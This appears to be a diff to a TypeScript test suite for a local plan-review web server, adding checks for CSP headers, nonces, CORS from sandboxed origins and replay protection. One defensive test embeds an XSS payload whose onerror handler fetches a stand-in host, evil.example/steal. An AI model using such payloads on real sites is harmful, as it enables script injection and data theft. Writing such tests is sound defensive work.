@@ -33,7 +33,7 @@ function harness(options: {
   mkdirSync(changeDir, { recursive: true });
   writeFileSync(join(changeDir, "proposal.md"), "# proposal\n");
   const htmlPath = join(cwd, "review.html");
-  writeFileSync(htmlPath, "<!doctype html><title>review</title>");
+  writeFileSync(htmlPath, "<!doctype html><head><title>review</title></head><script type=\"module\" crossorigin>window.reviewBooted=true</script>");
   const approvals: ReviewInput[] = [];
   const denials: ReviewInput[] = [];
   const surface = registerReviewSurface({
@@ -105,7 +105,20 @@ test("review sessions require exact mutation metadata and are not cacheable", as
   assert.equal(minted.response.headers.get("cache-control"), "no-store");
   assert.match(minted.reviewUrl || "", /^\/pl-review\/\?rid=/);
   const page = new Request(`${ORIGIN}${minted.reviewUrl}`, { headers: { host: "127.0.0.1:43191" } });
-  assert.equal((await handle(h, page))?.status, 200);
+  const pageResponse = (await handle(h, page))!;
+  assert.equal(pageResponse.status, 200);
+  assert.equal(pageResponse.headers.get("cache-control"), "no-store");
+  assert.equal(pageResponse.headers.get("referrer-policy"), "no-referrer");
+  const csp = pageResponse.headers.get("content-security-policy") || "";
+  assert.match(csp, /script-src-attr 'none'/);
+  assert.match(csp, /connect-src http:\/\/127\.0\.0\.1:43191/);
+  assert.doesNotMatch(csp, /script-src [^;]*'unsafe-inline'/);
+  const pageHtml = await pageResponse.text();
+  assert.match(pageHtml, /__hive_nonce/);
+  const nonce = /<script nonce="([a-f0-9]+)">/.exec(pageHtml)?.[1];
+  assert.ok(nonce);
+  assert.match(csp, new RegExp(`'nonce-${nonce}'`));
+  assert.match(pageHtml, new RegExp(`<script type="module" crossorigin nonce="${nonce}">`));
   const copiedWithoutNonce = new URL(`${ORIGIN}${minted.reviewUrl}`);
   copiedWithoutNonce.searchParams.delete("nonce");
   const copied = new Request(copiedWithoutNonce, { headers: { host: "127.0.0.1:43191" } });
@@ -128,6 +141,57 @@ test("missing nonce and forged Referer never invoke decision hooks", async () =>
   assert.equal((await handle(h, wrongHost))?.status, 403);
   assert.equal(h.approvals.length, 0);
   assert.equal(h.denials.length, 0);
+});
+
+test("an opaque sandbox origin uses query-bound capability without Referer", async () => {
+  const h = harness();
+  const { reviewUrl } = await mint(h);
+  const capability = new URL(`${ORIGIN}${reviewUrl}`);
+  const api = new URL(`${ORIGIN}/api/approve`);
+  api.searchParams.set("__hive_rid", capability.searchParams.get("rid")!);
+  api.searchParams.set("__hive_cwd", capability.searchParams.get("cwd")!);
+  api.searchParams.set("__hive_nonce", capability.searchParams.get("nonce")!);
+  const preflight = new Request(api, {
+    method: "OPTIONS",
+    headers: {
+      host: "127.0.0.1:43191",
+      origin: "null",
+      "access-control-request-method": "POST",
+      "access-control-request-headers": "content-type",
+    },
+  });
+  assert.equal(isAuthorizedReviewMutation(h.surface, preflight, new URL(preflight.url)), true);
+  const preflightResponse = (await handle(h, preflight))!;
+  assert.equal(preflightResponse.status, 204);
+  assert.equal(preflightResponse.headers.get("access-control-allow-origin"), "null");
+  assert.equal(preflightResponse.headers.get("cross-origin-resource-policy"), "cross-origin");
+
+  const req = new Request(api, {
+    method: "POST",
+    headers: { host: "127.0.0.1:43191", origin: "null", "content-type": "application/json" },
+    body: JSON.stringify({ feedback: "sandboxed approval" }),
+  });
+  assert.equal(isAuthorizedReviewMutation(h.surface, req, new URL(req.url)), true);
+  const response = (await handle(h, req))!;
+  assert.equal(response.status, 200);
+  assert.equal(response.headers.get("access-control-allow-origin"), "null");
+  assert.equal(h.approvals.length, 1);
+});
+
+test("hostile artifact Markdown stays JSON data under restrictive review CSP", async () => {
+  const h = harness();
+  const hostile = `<img src=x onerror="fetch('https://evil.example/steal')"><script>alert(document.domain)</script>`;
+  writeFileSync(join(h.cwd, "openspec", "changes", "add-auth", "proposal.md"), hostile);
+  const { reviewUrl } = await mint(h);
+  const capability = new URL(`${ORIGIN}${reviewUrl}`);
+  const api = new URL(`${ORIGIN}/api/plan`);
+  for (const key of ["rid", "cwd", "nonce"] as const) api.searchParams.set(`__hive_${key}`, capability.searchParams.get(key)!);
+  const req = new Request(api, { headers: { host: "127.0.0.1:43191", origin: "null" } });
+  const response = (await handle(h, req))!;
+  assert.equal(response.status, 200);
+  assert.match(response.headers.get("content-type") || "", /^application\/json/);
+  assert.match(response.headers.get("content-security-policy") || "", /connect-src 'self'/);
+  assert.equal((await response.json() as { plan: string }).plan, hostile);
 });
 
 test("a bound nonce authorizes one decision and rejects replay", async () => {
